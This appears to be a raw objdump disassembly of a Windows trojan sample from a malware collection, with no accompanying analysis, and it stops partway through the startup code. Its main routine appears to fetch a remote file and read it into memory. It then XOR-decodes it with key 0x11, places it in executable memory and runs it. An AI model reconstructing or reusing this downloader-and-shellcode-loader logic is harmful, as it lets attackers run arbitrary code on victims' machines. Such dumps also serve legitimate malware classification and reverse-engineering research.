
malware_samples/trojan/429c6b084511c355b26138f1eb90c10a564d269c54f256e2e04283ffb4e1c93c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	81 ec 14 01 00 00    	sub    $0x114,%esp
  401009:	6a 00                	push   $0x0
  40100b:	6a 00                	push   $0x0
  40100d:	68 04 01 00 00       	push   $0x104
  401012:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
  401018:	50                   	push   %eax
  401019:	68 a0 21 41 00       	push   $0x4121a0
  40101e:	6a 00                	push   $0x0
  401020:	e8 d3 01 00 00       	call   0x4011f8
  401025:	85 c0                	test   %eax,%eax
  401027:	7d 05                	jge    0x40102e
  401029:	e9 09 01 00 00       	jmp    0x401137
  40102e:	68 c4 21 41 00       	push   $0x4121c4
  401033:	8d 8d ec fe ff ff    	lea    -0x114(%ebp),%ecx
  401039:	51                   	push   %ecx
  40103a:	e8 b4 34 00 00       	call   0x4044f3
  40103f:	83 c4 08             	add    $0x8,%esp
  401042:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401045:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401049:	75 05                	jne    0x401050
  40104b:	e9 e7 00 00 00       	jmp    0x401137
  401050:	6a 02                	push   $0x2
  401052:	6a 00                	push   $0x0
  401054:	8b 55 fc             	mov    -0x4(%ebp),%edx
  401057:	52                   	push   %edx
  401058:	e8 ad 3a 00 00       	call   0x404b0a
  40105d:	83 c4 0c             	add    $0xc,%esp
  401060:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401063:	50                   	push   %eax
  401064:	e8 33 41 00 00       	call   0x40519c
  401069:	83 c4 04             	add    $0x4,%esp
  40106c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40106f:	6a 00                	push   $0x0
  401071:	6a 00                	push   $0x0
  401073:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401076:	51                   	push   %ecx
  401077:	e8 8e 3a 00 00       	call   0x404b0a
  40107c:	83 c4 0c             	add    $0xc,%esp
  40107f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  401082:	52                   	push   %edx
  401083:	6a 00                	push   $0x0
  401085:	ff 15 0c 20 41 00    	call   *0x41200c
  40108b:	50                   	push   %eax
  40108c:	ff 15 04 20 41 00    	call   *0x412004
  401092:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401095:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401098:	50                   	push   %eax
  401099:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40109c:	51                   	push   %ecx
  40109d:	6a 01                	push   $0x1
  40109f:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4010a2:	52                   	push   %edx
  4010a3:	e8 36 36 00 00       	call   0x4046de
  4010a8:	83 c4 10             	add    $0x10,%esp
  4010ab:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4010ae:	50                   	push   %eax
  4010af:	e8 58 33 00 00       	call   0x40440c
  4010b4:	83 c4 04             	add    $0x4,%esp
  4010b7:	6a 11                	push   $0x11
  4010b9:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4010bc:	51                   	push   %ecx
  4010bd:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4010c0:	52                   	push   %edx
  4010c1:	e8 9a 00 00 00       	call   0x401160
  4010c6:	83 c4 0c             	add    $0xc,%esp
  4010c9:	6a 40                	push   $0x40
  4010cb:	68 00 30 00 00       	push   $0x3000
  4010d0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4010d3:	50                   	push   %eax
  4010d4:	6a 00                	push   $0x0
  4010d6:	ff 15 20 20 41 00    	call   *0x412020
  4010dc:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4010df:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  4010e3:	75 16                	jne    0x4010fb
  4010e5:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4010e8:	51                   	push   %ecx
  4010e9:	6a 00                	push   $0x0
  4010eb:	ff 15 0c 20 41 00    	call   *0x41200c
  4010f1:	50                   	push   %eax
  4010f2:	ff 15 08 20 41 00    	call   *0x412008
  4010f8:	90                   	nop
  4010f9:	eb 3c                	jmp    0x401137
  4010fb:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4010fe:	52                   	push   %edx
  4010ff:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401102:	50                   	push   %eax
  401103:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401106:	51                   	push   %ecx
  401107:	e8 a4 0d 00 00       	call   0x401eb0
  40110c:	83 c4 0c             	add    $0xc,%esp
  40110f:	ff 55 f0             	call   *-0x10(%ebp)
  401112:	68 00 80 00 00       	push   $0x8000
  401117:	6a 00                	push   $0x0
  401119:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40111c:	52                   	push   %edx
  40111d:	ff 15 24 20 41 00    	call   *0x412024
  401123:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401126:	50                   	push   %eax
  401127:	6a 00                	push   $0x0
  401129:	ff 15 0c 20 41 00    	call   *0x41200c
  40112f:	50                   	push   %eax
  401130:	ff 15 08 20 41 00    	call   *0x412008
  401136:	90                   	nop
  401137:	8b e5                	mov    %ebp,%esp
  401139:	5d                   	pop    %ebp
  40113a:	c3                   	ret
  40113b:	cc                   	int3
  40113c:	cc                   	int3
  40113d:	cc                   	int3
  40113e:	cc                   	int3
  40113f:	cc                   	int3
  401140:	55                   	push   %ebp
  401141:	8b ec                	mov    %esp,%ebp
  401143:	b8 01 00 00 00       	mov    $0x1,%eax
  401148:	85 c0                	test   %eax,%eax
  40114a:	74 0b                	je     0x401157
  40114c:	6a 64                	push   $0x64
  40114e:	ff 15 14 20 41 00    	call   *0x412014
  401154:	90                   	nop
  401155:	eb ec                	jmp    0x401143
  401157:	33 c0                	xor    %eax,%eax
  401159:	5d                   	pop    %ebp
  40115a:	c2 04 00             	ret    $0x4
  40115d:	cc                   	int3
  40115e:	cc                   	int3
  40115f:	cc                   	int3
  401160:	55                   	push   %ebp
  401161:	8b ec                	mov    %esp,%ebp
  401163:	51                   	push   %ecx
  401164:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40116b:	eb 09                	jmp    0x401176
  40116d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401170:	83 c0 01             	add    $0x1,%eax
  401173:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401176:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401179:	3b 4d 0c             	cmp    0xc(%ebp),%ecx
  40117c:	73 19                	jae    0x401197
  40117e:	0f b6 55 10          	movzbl 0x10(%ebp),%edx
  401182:	8b 45 08             	mov    0x8(%ebp),%eax
  401185:	03 45 fc             	add    -0x4(%ebp),%eax
  401188:	0f b6 08             	movzbl (%eax),%ecx
  40118b:	33 ca                	xor    %edx,%ecx
  40118d:	8b 55 08             	mov    0x8(%ebp),%edx
  401190:	03 55 fc             	add    -0x4(%ebp),%edx
  401193:	88 0a                	mov    %cl,(%edx)
  401195:	eb d6                	jmp    0x40116d
  401197:	8b e5                	mov    %ebp,%esp
  401199:	5d                   	pop    %ebp
  40119a:	c3                   	ret
  40119b:	cc                   	int3
  40119c:	cc                   	int3
  40119d:	cc                   	int3
  40119e:	cc                   	int3
  40119f:	cc                   	int3
  4011a0:	55                   	push   %ebp
  4011a1:	8b ec                	mov    %esp,%ebp
  4011a3:	51                   	push   %ecx
  4011a4:	6a 00                	push   $0x0
  4011a6:	6a 00                	push   $0x0
  4011a8:	6a 00                	push   $0x0
  4011aa:	68 40 11 40 00       	push   $0x401140
  4011af:	6a 00                	push   $0x0
  4011b1:	6a 00                	push   $0x0
  4011b3:	ff 15 1c 20 41 00    	call   *0x41201c
  4011b9:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4011bc:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4011c0:	75 07                	jne    0x4011c9
  4011c2:	b8 01 00 00 00       	mov    $0x1,%eax
  4011c7:	eb 29                	jmp    0x4011f2
  4011c9:	6a 00                	push   $0x0
  4011cb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4011ce:	50                   	push   %eax
  4011cf:	68 00 10 40 00       	push   $0x401000
  4011d4:	ff 15 18 20 41 00    	call   *0x412018
  4011da:	6a ff                	push   $0xffffffff
  4011dc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4011df:	51                   	push   %ecx
  4011e0:	ff 15 10 20 41 00    	call   *0x412010
  4011e6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4011e9:	52                   	push   %edx
  4011ea:	ff 15 00 20 41 00    	call   *0x412000
  4011f0:	33 c0                	xor    %eax,%eax
  4011f2:	8b e5                	mov    %ebp,%esp
  4011f4:	5d                   	pop    %ebp
  4011f5:	c2 10 00             	ret    $0x10
  4011f8:	ff 25 40 21 41 00    	jmp    *0x412140
  4011fe:	56                   	push   %esi
  4011ff:	6a 02                	push   $0x2
  401201:	e8 12 41 00 00       	call   0x405318
  401206:	e8 33 05 00 00       	call   0x40173e
  40120b:	50                   	push   %eax
  40120c:	e8 f2 4a 00 00       	call   0x405d03
  401211:	e8 21 05 00 00       	call   0x401737
  401216:	8b f0                	mov    %eax,%esi
  401218:	e8 42 4d 00 00       	call   0x405f5f
  40121d:	6a 01                	push   $0x1
  40121f:	89 30                	mov    %esi,(%eax)
  401221:	e8 d3 02 00 00       	call   0x4014f9
  401226:	83 c4 0c             	add    $0xc,%esp
  401229:	5e                   	pop    %esi
  40122a:	84 c0                	test   %al,%al
  40122c:	74 73                	je     0x4012a1
  40122e:	db e2                	fnclex
  401230:	e8 7c 07 00 00       	call   0x4019b1
  401235:	68 dd 19 40 00       	push   $0x4019dd
  40123a:	e8 4b 04 00 00       	call   0x40168a
  40123f:	e8 f6 04 00 00       	call   0x40173a
  401244:	50                   	push   %eax
  401245:	e8 7a 44 00 00       	call   0x4056c4
  40124a:	59                   	pop    %ecx
  40124b:	59                   	pop    %ecx
  40124c:	85 c0                	test   %eax,%eax
  40124e:	75 51                	jne    0x4012a1
  401250:	e8 ef 04 00 00       	call   0x401744
  401255:	e8 46 05 00 00       	call   0x4017a0
  40125a:	85 c0                	test   %eax,%eax
  40125c:	74 0b                	je     0x401269
  40125e:	68 37 17 40 00       	push   $0x401737
  401263:	e8 38 41 00 00       	call   0x4053a0
  401268:	59                   	pop    %ecx
  401269:	e8 06 05 00 00       	call   0x401774
  40126e:	e8 01 05 00 00       	call   0x401774
  401273:	e8 db 04 00 00       	call   0x401753
  401278:	e8 ba 04 00 00       	call   0x401737
  40127d:	50                   	push   %eax
  40127e:	e8 2e 4c 00 00       	call   0x405eb1
  401283:	59                   	pop    %ecx
  401284:	e8 c7 04 00 00       	call   0x401750
  401289:	84 c0                	test   %al,%al
  40128b:	74 05                	je     0x401292
  40128d:	e8 32 46 00 00       	call   0x4058c4
  401292:	e8 a0 04 00 00       	call   0x401737
  401297:	e8 61 06 00 00       	call   0x4018fd
  40129c:	85 c0                	test   %eax,%eax
  40129e:	75 01                	jne    0x4012a1
  4012a0:	c3                   	ret
  4012a1:	6a 07                	push   $0x7
  4012a3:	e8 10 05 00 00       	call   0x4017b8
  4012a8:	cc                   	int3
  4012a9:	e8 d5 04 00 00       	call   0x401783
  4012ae:	33 c0                	xor    %eax,%eax
  4012b0:	c3                   	ret
  4012b1:	e8 8e 06 00 00       	call   0x401944
  4012b6:	e8 7c 04 00 00       	call   0x401737
  4012bb:	50                   	push   %eax
  4012bc:	e8 6f 4c 00 00       	call   0x405f30
  4012c1:	59                   	pop    %ecx
  4012c2:	c3                   	ret
  4012c3:	6a 14                	push   $0x14
  4012c5:	68 68 74 41 00       	push   $0x417468
  4012ca:	e8 41 07 00 00       	call   0x401a10
  4012cf:	6a 01                	push   $0x1
  4012d1:	e8 ea 01 00 00       	call   0x4014c0
  4012d6:	59                   	pop    %ecx
  4012d7:	84 c0                	test   %al,%al
  4012d9:	0f 84 4d 01 00 00    	je     0x40142c
  4012df:	32 db                	xor    %bl,%bl
  4012e1:	88 5d e7             	mov    %bl,-0x19(%ebp)
  4012e4:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4012eb:	e8 9e 01 00 00       	call   0x40148e
  4012f0:	88 45 dc             	mov    %al,-0x24(%ebp)
  4012f3:	a1 88 99 41 00       	mov    0x419988,%eax
  4012f8:	33 c9                	xor    %ecx,%ecx
  4012fa:	41                   	inc    %ecx
  4012fb:	3b c1                	cmp    %ecx,%eax
  4012fd:	0f 84 29 01 00 00    	je     0x40142c
  401303:	85 c0                	test   %eax,%eax
  401305:	75 49                	jne    0x401350
  401307:	89 0d 88 99 41 00    	mov    %ecx,0x419988
  40130d:	68 78 21 41 00       	push   $0x412178
  401312:	68 5c 21 41 00       	push   $0x41215c
  401317:	e8 30 46 00 00       	call   0x40594c
  40131c:	59                   	pop    %ecx
  40131d:	59                   	pop    %ecx
  40131e:	85 c0                	test   %eax,%eax
  401320:	74 11                	je     0x401333
  401322:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  401329:	b8 ff 00 00 00       	mov    $0xff,%eax
  40132e:	e9 e9 00 00 00       	jmp    0x40141c
  401333:	68 58 21 41 00       	push   $0x412158
  401338:	68 50 21 41 00       	push   $0x412150
  40133d:	e8 df 45 00 00       	call   0x405921
  401342:	59                   	pop    %ecx
  401343:	59                   	pop    %ecx
  401344:	c7 05 88 99 41 00 02 	movl   $0x2,0x419988
  40134b:	00 00 00 
  40134e:	eb 05                	jmp    0x401355
  401350:	8a d9                	mov    %cl,%bl
  401352:	88 5d e7             	mov    %bl,-0x19(%ebp)
  401355:	ff 75 dc             	push   -0x24(%ebp)
  401358:	e8 ba 02 00 00       	call   0x401617
  40135d:	59                   	pop    %ecx
  40135e:	e8 49 04 00 00       	call   0x4017ac
  401363:	8b f0                	mov    %eax,%esi
  401365:	33 ff                	xor    %edi,%edi
  401367:	39 3e                	cmp    %edi,(%esi)
  401369:	74 1b                	je     0x401386
  40136b:	56                   	push   %esi
  40136c:	e8 0f 02 00 00       	call   0x401580
  401371:	59                   	pop    %ecx
  401372:	84 c0                	test   %al,%al
  401374:	74 10                	je     0x401386
  401376:	8b 36                	mov    (%esi),%esi
  401378:	57                   	push   %edi
  401379:	6a 02                	push   $0x2
  40137b:	57                   	push   %edi
  40137c:	8b ce                	mov    %esi,%ecx
  40137e:	ff 15 48 21 41 00    	call   *0x412148
  401384:	ff d6                	call   *%esi
  401386:	e8 27 04 00 00       	call   0x4017b2
  40138b:	8b f0                	mov    %eax,%esi
  40138d:	39 3e                	cmp    %edi,(%esi)
  40138f:	74 13                	je     0x4013a4
  401391:	56                   	push   %esi
  401392:	e8 e9 01 00 00       	call   0x401580
  401397:	59                   	pop    %ecx
  401398:	84 c0                	test   %al,%al
  40139a:	74 08                	je     0x4013a4
  40139c:	ff 36                	push   (%esi)
  40139e:	e8 f7 48 00 00       	call   0x405c9a
  4013a3:	59                   	pop    %ecx
  4013a4:	e8 24 05 00 00       	call   0x4018cd
  4013a9:	0f b7 f0             	movzwl %ax,%esi
  4013ac:	e8 18 45 00 00       	call   0x4058c9
  4013b1:	56                   	push   %esi
  4013b2:	50                   	push   %eax
  4013b3:	57                   	push   %edi
  4013b4:	68 00 00 40 00       	push   $0x400000
  4013b9:	e8 e2 fd ff ff       	call   0x4011a0
  4013be:	8b f0                	mov    %eax,%esi
  4013c0:	e8 3d 05 00 00       	call   0x401902
  4013c5:	84 c0                	test   %al,%al
  4013c7:	74 6a                	je     0x401433
  4013c9:	84 db                	test   %bl,%bl
  4013cb:	75 05                	jne    0x4013d2
  4013cd:	e8 a3 48 00 00       	call   0x405c75
  4013d2:	57                   	push   %edi
  4013d3:	6a 01                	push   $0x1
  4013d5:	e8 5a 02 00 00       	call   0x401634
  4013da:	59                   	pop    %ecx
  4013db:	59                   	pop    %ecx
  4013dc:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4013e3:	8b c6                	mov    %esi,%eax
  4013e5:	eb 35                	jmp    0x40141c
  4013e7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4013ea:	8b 01                	mov    (%ecx),%eax
  4013ec:	8b 00                	mov    (%eax),%eax
  4013ee:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4013f1:	51                   	push   %ecx
  4013f2:	50                   	push   %eax
  4013f3:	e8 d4 3d 00 00       	call   0x4051cc
  4013f8:	59                   	pop    %ecx
  4013f9:	59                   	pop    %ecx
  4013fa:	c3                   	ret
  4013fb:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4013fe:	e8 ff 04 00 00       	call   0x401902
  401403:	84 c0                	test   %al,%al
  401405:	74 32                	je     0x401439
  401407:	80 7d e7 00          	cmpb   $0x0,-0x19(%ebp)
  40140b:	75 05                	jne    0x401412
  40140d:	e8 54 48 00 00       	call   0x405c66
  401412:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  401419:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40141c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40141f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401426:	59                   	pop    %ecx
  401427:	5f                   	pop    %edi
  401428:	5e                   	pop    %esi
  401429:	5b                   	pop    %ebx
  40142a:	c9                   	leave
  40142b:	c3                   	ret
  40142c:	6a 07                	push   $0x7
  40142e:	e8 85 03 00 00       	call   0x4017b8
  401433:	56                   	push   %esi
  401434:	e8 87 48 00 00       	call   0x405cc0
  401439:	ff 75 e0             	push   -0x20(%ebp)
  40143c:	e8 43 48 00 00       	call   0x405c84
  401441:	cc                   	int3
  401442:	e8 a5 02 00 00       	call   0x4016ec
  401447:	e9 77 fe ff ff       	jmp    0x4012c3
  40144c:	55                   	push   %ebp
  40144d:	8b ec                	mov    %esp,%ebp
  40144f:	8b 45 08             	mov    0x8(%ebp),%eax
  401452:	56                   	push   %esi
  401453:	8b 48 3c             	mov    0x3c(%eax),%ecx
  401456:	03 c8                	add    %eax,%ecx
  401458:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  40145c:	8d 51 18             	lea    0x18(%ecx),%edx
  40145f:	03 d0                	add    %eax,%edx
  401461:	0f b7 41 06          	movzwl 0x6(%ecx),%eax
  401465:	6b f0 28             	imul   $0x28,%eax,%esi
  401468:	03 f2                	add    %edx,%esi
  40146a:	eb 15                	jmp    0x401481
  40146c:	8b 4a 0c             	mov    0xc(%edx),%ecx
  40146f:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  401472:	72 0a                	jb     0x40147e
  401474:	8b 42 08             	mov    0x8(%edx),%eax
  401477:	03 c1                	add    %ecx,%eax
  401479:	39 45 0c             	cmp    %eax,0xc(%ebp)
  40147c:	72 0c                	jb     0x40148a
  40147e:	83 c2 28             	add    $0x28,%edx
  401481:	3b d6                	cmp    %esi,%edx
  401483:	75 e7                	jne    0x40146c
  401485:	33 c0                	xor    %eax,%eax
  401487:	5e                   	pop    %esi
  401488:	5d                   	pop    %ebp
  401489:	c3                   	ret
  40148a:	8b c2                	mov    %edx,%eax
  40148c:	eb f9                	jmp    0x401487
  40148e:	56                   	push   %esi
  40148f:	e8 db 08 00 00       	call   0x401d6f
  401494:	85 c0                	test   %eax,%eax
  401496:	74 20                	je     0x4014b8
  401498:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  40149e:	be 8c 99 41 00       	mov    $0x41998c,%esi
  4014a3:	8b 50 04             	mov    0x4(%eax),%edx
  4014a6:	eb 04                	jmp    0x4014ac
  4014a8:	3b d0                	cmp    %eax,%edx
  4014aa:	74 10                	je     0x4014bc
  4014ac:	33 c0                	xor    %eax,%eax
  4014ae:	8b ca                	mov    %edx,%ecx
  4014b0:	f0 0f b1 0e          	lock cmpxchg %ecx,(%esi)
  4014b4:	85 c0                	test   %eax,%eax
  4014b6:	75 f0                	jne    0x4014a8
  4014b8:	32 c0                	xor    %al,%al
  4014ba:	5e                   	pop    %esi
  4014bb:	c3                   	ret
  4014bc:	b0 01                	mov    $0x1,%al
  4014be:	5e                   	pop    %esi
  4014bf:	c3                   	ret
  4014c0:	55                   	push   %ebp
  4014c1:	8b ec                	mov    %esp,%ebp
  4014c3:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4014c7:	75 07                	jne    0x4014d0
  4014c9:	c6 05 90 99 41 00 01 	movb   $0x1,0x419990
  4014d0:	e8 80 05 00 00       	call   0x401a55
  4014d5:	e8 f4 10 00 00       	call   0x4025ce
  4014da:	84 c0                	test   %al,%al
  4014dc:	75 04                	jne    0x4014e2
  4014de:	32 c0                	xor    %al,%al
  4014e0:	5d                   	pop    %ebp
  4014e1:	c3                   	ret
  4014e2:	e8 cc 4e 00 00       	call   0x4063b3
  4014e7:	84 c0                	test   %al,%al
  4014e9:	75 0a                	jne    0x4014f5
  4014eb:	6a 00                	push   $0x0
  4014ed:	e8 fb 10 00 00       	call   0x4025ed
  4014f2:	59                   	pop    %ecx
  4014f3:	eb e9                	jmp    0x4014de
  4014f5:	b0 01                	mov    $0x1,%al
  4014f7:	5d                   	pop    %ebp
  4014f8:	c3                   	ret
  4014f9:	55                   	push   %ebp
  4014fa:	8b ec                	mov    %esp,%ebp
  4014fc:	80 3d 91 99 41 00 00 	cmpb   $0x0,0x419991
  401503:	74 04                	je     0x401509
  401505:	b0 01                	mov    $0x1,%al
  401507:	5d                   	pop    %ebp
  401508:	c3                   	ret
  401509:	56                   	push   %esi
  40150a:	8b 75 08             	mov    0x8(%ebp),%esi
  40150d:	85 f6                	test   %esi,%esi
  40150f:	74 05                	je     0x401516
  401511:	83 fe 01             	cmp    $0x1,%esi
  401514:	75 62                	jne    0x401578
  401516:	e8 54 08 00 00       	call   0x401d6f
  40151b:	85 c0                	test   %eax,%eax
  40151d:	74 26                	je     0x401545
  40151f:	85 f6                	test   %esi,%esi
  401521:	75 22                	jne    0x401545
  401523:	68 94 99 41 00       	push   $0x419994
  401528:	e8 2f 4d 00 00       	call   0x40625c
  40152d:	59                   	pop    %ecx
  40152e:	85 c0                	test   %eax,%eax
  401530:	75 0f                	jne    0x401541
  401532:	68 a0 99 41 00       	push   $0x4199a0
  401537:	e8 20 4d 00 00       	call   0x40625c
  40153c:	59                   	pop    %ecx
  40153d:	85 c0                	test   %eax,%eax
  40153f:	74 2b                	je     0x40156c
  401541:	32 c0                	xor    %al,%al
  401543:	eb 30                	jmp    0x401575
  401545:	83 c9 ff             	or     $0xffffffff,%ecx
  401548:	89 0d 94 99 41 00    	mov    %ecx,0x419994
  40154e:	89 0d 98 99 41 00    	mov    %ecx,0x419998
  401554:	89 0d 9c 99 41 00    	mov    %ecx,0x41999c
  40155a:	89 0d a0 99 41 00    	mov    %ecx,0x4199a0
  401560:	89 0d a4 99 41 00    	mov    %ecx,0x4199a4
  401566:	89 0d a8 99 41 00    	mov    %ecx,0x4199a8
  40156c:	c6 05 91 99 41 00 01 	movb   $0x1,0x419991
  401573:	b0 01                	mov    $0x1,%al
  401575:	5e                   	pop    %esi
  401576:	5d                   	pop    %ebp
  401577:	c3                   	ret
  401578:	6a 05                	push   $0x5
  40157a:	e8 39 02 00 00       	call   0x4017b8
  40157f:	cc                   	int3
  401580:	6a 08                	push   $0x8
  401582:	68 88 74 41 00       	push   $0x417488
  401587:	e8 84 04 00 00       	call   0x401a10
  40158c:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  401593:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  401598:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  40159f:	75 5d                	jne    0x4015fe
  4015a1:	a1 3c 00 40 00       	mov    0x40003c,%eax
  4015a6:	81 b8 00 00 40 00 50 	cmpl   $0x4550,0x400000(%eax)
  4015ad:	45 00 00 
  4015b0:	75 4c                	jne    0x4015fe
  4015b2:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  4015b7:	66 39 88 18 00 40 00 	cmp    %cx,0x400018(%eax)
  4015be:	75 3e                	jne    0x4015fe
  4015c0:	8b 45 08             	mov    0x8(%ebp),%eax
  4015c3:	b9 00 00 40 00       	mov    $0x400000,%ecx
  4015c8:	2b c1                	sub    %ecx,%eax
  4015ca:	50                   	push   %eax
  4015cb:	51                   	push   %ecx
  4015cc:	e8 7b fe ff ff       	call   0x40144c
  4015d1:	59                   	pop    %ecx
  4015d2:	59                   	pop    %ecx
  4015d3:	85 c0                	test   %eax,%eax
  4015d5:	74 27                	je     0x4015fe
  4015d7:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
  4015db:	7c 21                	jl     0x4015fe
  4015dd:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4015e4:	b0 01                	mov    $0x1,%al
  4015e6:	eb 1f                	jmp    0x401607
  4015e8:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4015eb:	8b 00                	mov    (%eax),%eax
  4015ed:	33 c9                	xor    %ecx,%ecx
  4015ef:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  4015f5:	0f 94 c1             	sete   %cl
  4015f8:	8b c1                	mov    %ecx,%eax
  4015fa:	c3                   	ret
  4015fb:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4015fe:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  401605:	32 c0                	xor    %al,%al
  401607:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40160a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401611:	59                   	pop    %ecx
  401612:	5f                   	pop    %edi
  401613:	5e                   	pop    %esi
  401614:	5b                   	pop    %ebx
  401615:	c9                   	leave
  401616:	c3                   	ret
  401617:	55                   	push   %ebp
  401618:	8b ec                	mov    %esp,%ebp
  40161a:	e8 50 07 00 00       	call   0x401d6f
  40161f:	85 c0                	test   %eax,%eax
  401621:	74 0f                	je     0x401632
  401623:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  401627:	75 09                	jne    0x401632
  401629:	33 c0                	xor    %eax,%eax
  40162b:	b9 8c 99 41 00       	mov    $0x41998c,%ecx
  401630:	87 01                	xchg   %eax,(%ecx)
  401632:	5d                   	pop    %ebp
  401633:	c3                   	ret
  401634:	55                   	push   %ebp
  401635:	8b ec                	mov    %esp,%ebp
  401637:	80 3d 90 99 41 00 00 	cmpb   $0x0,0x419990
  40163e:	74 06                	je     0x401646
  401640:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  401644:	75 12                	jne    0x401658
  401646:	ff 75 08             	push   0x8(%ebp)
  401649:	e8 77 4d 00 00       	call   0x4063c5
  40164e:	ff 75 08             	push   0x8(%ebp)
  401651:	e8 97 0f 00 00       	call   0x4025ed
  401656:	59                   	pop    %ecx
  401657:	59                   	pop    %ecx
  401658:	b0 01                	mov    $0x1,%al
  40165a:	5d                   	pop    %ebp
  40165b:	c3                   	ret
  40165c:	55                   	push   %ebp
  40165d:	8b ec                	mov    %esp,%ebp
  40165f:	83 3d 94 99 41 00 ff 	cmpl   $0xffffffff,0x419994
  401666:	ff 75 08             	push   0x8(%ebp)
  401669:	75 07                	jne    0x401672
  40166b:	e8 98 4b 00 00       	call   0x406208
  401670:	eb 0b                	jmp    0x40167d
  401672:	68 94 99 41 00       	push   $0x419994
  401677:	e8 09 4c 00 00       	call   0x406285
  40167c:	59                   	pop    %ecx
  40167d:	59                   	pop    %ecx
  40167e:	33 c9                	xor    %ecx,%ecx
  401680:	85 c0                	test   %eax,%eax
  401682:	0f 44 4d 08          	cmove  0x8(%ebp),%ecx
  401686:	8b c1                	mov    %ecx,%eax
  401688:	5d                   	pop    %ebp
  401689:	c3                   	ret
  40168a:	55                   	push   %ebp
  40168b:	8b ec                	mov    %esp,%ebp
  40168d:	ff 75 08             	push   0x8(%ebp)
  401690:	e8 c7 ff ff ff       	call   0x40165c
  401695:	f7 d8                	neg    %eax
  401697:	59                   	pop    %ecx
  401698:	1b c0                	sbb    %eax,%eax
  40169a:	f7 d8                	neg    %eax
  40169c:	48                   	dec    %eax
  40169d:	5d                   	pop    %ebp
  40169e:	c3                   	ret
  40169f:	55                   	push   %ebp
  4016a0:	8b ec                	mov    %esp,%ebp
  4016a2:	83 ec 14             	sub    $0x14,%esp
  4016a5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4016a8:	0f 57 c0             	xorps  %xmm0,%xmm0
  4016ab:	50                   	push   %eax
  4016ac:	66 0f 13 45 f4       	movlpd %xmm0,-0xc(%ebp)
  4016b1:	ff 15 3c 20 41 00    	call   *0x41203c
  4016b7:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4016ba:	33 45 f4             	xor    -0xc(%ebp),%eax
  4016bd:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4016c0:	ff 15 38 20 41 00    	call   *0x412038
  4016c6:	31 45 fc             	xor    %eax,-0x4(%ebp)
  4016c9:	ff 15 34 20 41 00    	call   *0x412034
  4016cf:	31 45 fc             	xor    %eax,-0x4(%ebp)
  4016d2:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4016d5:	50                   	push   %eax
  4016d6:	ff 15 30 20 41 00    	call   *0x412030
  4016dc:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4016df:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  4016e2:	33 45 ec             	xor    -0x14(%ebp),%eax
  4016e5:	33 45 fc             	xor    -0x4(%ebp),%eax
  4016e8:	33 c1                	xor    %ecx,%eax
  4016ea:	c9                   	leave
  4016eb:	c3                   	ret
  4016ec:	8b 0d 40 90 41 00    	mov    0x419040,%ecx
